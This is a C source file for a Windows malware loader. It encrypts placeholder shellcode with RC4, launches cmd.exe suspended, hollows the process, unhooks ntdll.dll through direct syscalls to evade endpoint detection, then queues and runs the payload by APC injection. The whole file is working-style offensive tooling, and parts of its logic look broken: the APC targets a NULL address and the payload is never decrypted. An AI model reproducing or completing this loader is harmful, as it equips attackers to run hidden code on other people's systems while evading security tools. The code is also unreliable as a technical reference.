#include <windows.h>
#include <stdio.h>
#include "ProcessCreation.h"
#include "PayloadInjection.h"
#include "RC4Encryption.h"
#include "Syscalls.h"
#include "Hollowing.h"

int main() {
    DWORD processId;
    HANDLE hProcess, hThread;
    SyscallStruct St;

    // Initialize syscalls
    if (!InitializeSyscallStruct(&St)) {
        printf("[!] Could Not Initialize Syscalls\n");
        return -1;
    }

    // Step 1: Define the payload and RC4 encryption key
    printf("[*] Defining payload and encryption key...\n");
    unsigned char payload[] = {
        0x90, 0x90, 0x90, /* shellcode here */
    };
    unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key

    // Step 2: Encrypt the payload using RC4
    printf("[*] Encrypting payload with RC4...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));
    printf("[+] Payload encrypted successfully.\n");

    // Step 3: Create a suspended process (cmd.exe)
    printf("[*] Creating a suspended process (cmd.exe)...\n");
    if (!CreateSuspendedProcess("cmd.exe", &processId, &hProcess, &hThread)) {
        printf("[!] Failed to create process.\n");
        return -1;
    }
    printf("[+] Process created successfully with PID: %d.\n", processId);

    //// Step 4: Perform process hollowing
    //if (!HollowProcess(hProcess, payload, sizeof(payload))) {
    //    printf("[!] Process hollowing failed.\n");
    //    return -1;
    //}

    //// Step 5: Unhook ntdll.dll to evade detection
    //if (!UnhookDLL(hProcess)) {
    //    printf("[!] Failed to unhook ntdll.dll.\n");
    //    return -1;
    //}
    // Step 4: Perform process hollowing
    if (!HollowProcess(hProcess, payload, sizeof(payload), &St)) {
        printf("[!] Process hollowing failed.\n");
        return -1;
    }

    // Step 5: Unhook ntdll.dll to evade detection
    if (!UnhookDLL(hProcess, &St)) {
        printf("[!] Failed to unhook ntdll.dll.\n");
        return -1;
    }


    // Step 6: Queue the payload for execution using APC injection
    printf("[*] Queuing the payload using NtQueueApcThread...\n");
    PVOID pBaseAddress = NULL; // Injected base address
    SIZE_T regionSize = sizeof(payload);
    ULONG oldProtect;
    NTSTATUS status = St.NtQueueApcThread(hThread, pBaseAddress, NULL, NULL, 0);  // ULONG 0
    if (status != 0) {
        printf("[!] NtQueueApcThread failed with error: 0x%08X\n", status);
        return -1;
    }
    printf("[+] Payload successfully queued for APC injection.\n");

    // Step 7: Resume the thread to execute the payload
    printf("[*] Resuming the thread to execute the payload...\n");
    ResumeThread(hThread);
    printf("[+] Thread resumed, payload should now execute.\n");

    return 0;
}
